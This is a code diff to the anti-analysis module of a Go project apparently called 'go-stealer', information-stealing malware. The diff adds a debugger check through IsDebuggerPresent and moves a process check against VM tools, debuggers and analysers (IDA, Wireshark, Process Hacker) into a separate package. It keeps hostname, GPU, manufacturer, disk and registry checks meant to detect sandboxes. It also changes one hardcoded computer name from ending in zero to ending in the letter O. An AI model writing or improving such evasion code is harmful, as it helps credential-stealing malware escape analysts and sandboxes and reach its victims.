@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"go-stealer/anti_vm"
 	"os"
 	"slices"
 	"strings"
@@ -9,14 +10,18 @@ import (
 	"golang.org/x/sys/windows/registry"
 )
 
+var (
+	isDebuggerPresent = kernel32.NewProc("IsDebuggerPresent")
+)
+
 // checkGPU checks for the presence of virtual GPU drivers.
 func checkGPU() bool {
-	cmd := executeCommand("powershell", "-Command", "Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name")
+	cmd := executeCommand("powershell", "-Command", "Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name")
 	var out bytes.Buffer
 	cmd.Stdout = &out
 
 	if err := cmd.Run(); err != nil {
-		panic(err)
+		return false
 	}
 
 	gpus := strings.Split(strings.TrimSpace(out.String()), "\n")
@@ -28,17 +33,18 @@ func checkGPU() bool {
 			return true
 		}
 	}
+
 	return false
 }
 
 // checkManufacturer checks the system manufacturer for known virtual machine vendors, hypervisors, or cloud providers.
 func checkManufacturer() bool {
-	cmd := executeCommand("powershell", "-Command", "Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer")
+	cmd := executeCommand("powershell", "-Command", "Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer")
 	var out bytes.Buffer
 	cmd.Stdout = &out
 
 	if err := cmd.Run(); err != nil {
-		panic(err)
+		return false
 	}
 
 	manufacturer := strings.TrimSpace(strings.ToLower(out.String()))
@@ -47,33 +53,6 @@ func checkManufacturer() bool {
 		strings.Contains(manufacturer, "qemu") || strings.Contains(manufacturer, "kvm") ||
 		strings.Contains(manufacturer, "microsoft corporation") || strings.Contains(manufacturer, "xen") {
 		return true
-	}
-	return false
-}
-
-// checkProcesses checks for the presence of common VM-related processes, debuggers, and analysis tools.
-func checkProcesses() bool {
-	cmd := executeCommand("powershell", "-Command", "Get-Process | Select-Object -ExpandProperty ProcessName")
-	var out bytes.Buffer
-	cmd.Stdout = &out
-
-	if err := cmd.Run(); err != nil {
-		panic(err)
-	}
-
-	processes := strings.Split(strings.TrimSpace(out.String()), "\n")
-	// List of common VM-related processes, debuggers, and analysis tools
-	detected := []string{
-		"vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "vmwareuser", "qemu-ga", "xenservice", "xenclient",
-		"ollydbg", "ida", "ida64", "idag", "idag64", "idaw", "idaw64", "idaq", "idaq64", "scylla", "scylla_x64", "scylla_x86",
-		"procexp", "procexp64", "processhacker", "processhacker.exe", "wireshark", "fiddler", "httpdebuggerui",
-		"httpdebuggersvc", "qemu", "vmmouse", "vmusrvc", "vmsrvc",
-	}
-	for _, process := range processes {
-		process = strings.TrimSpace(strings.ToLower(process))
-		if slices.Contains(detected, process) {
-			return true
-		}
 	}
 	return false
 }
@@ -91,7 +70,7 @@ func checkUsername() bool {
 func checkComputerName() bool {
 	computerName := strings.TrimSpace(strings.ToLower(os.Getenv("COMPUTERNAME")))
 	suspiciousNames := []string{
-		"desktop-c8gqkg7", "maspenc", "desktop-dsmevvl", "desktop-et51aj0", "win-5e07c0s9alr",
+		"desktop-c8gqkg7", "maspenc", "desktop-dsmevvl", "desktop-et51ajO", "win-5e07c0s9alr",
 	}
 	return slices.Contains(suspiciousNames, computerName)
 }
@@ -104,7 +83,7 @@ func checkDiskModel() bool {
 	cmd.Stdout = &out
 
 	if err := cmd.Run(); err != nil {
-		panic(err)
+		return false
 	}
 
 	models := strings.Split(strings.TrimSpace(out.String()), "\n")
@@ -138,7 +117,10 @@ func checkRegeditKeys() bool {
 // IsVM aggregates all checks to determine if the program is running in a virtualized environment.
 // By "virtualized environment", I mean any virtual machine, sandbox, hypervisor, or cloud provider environment (e.g., AWS, Azure, GCP).
 func IsVM() bool {
-	return checkComputerName() || checkUsername() || checkProcesses() || checkManufacturer() || checkGPU() ||
+	ret, _, _ := isDebuggerPresent.Call()
+
+	// ret != 0 means a debugger is present
+	return ret != 0 || checkComputerName() || checkUsername() || anti_vm.CheckProcesses() || checkManufacturer() || checkGPU() ||
 		checkDiskModel() || checkRegeditKeys()
 }
 
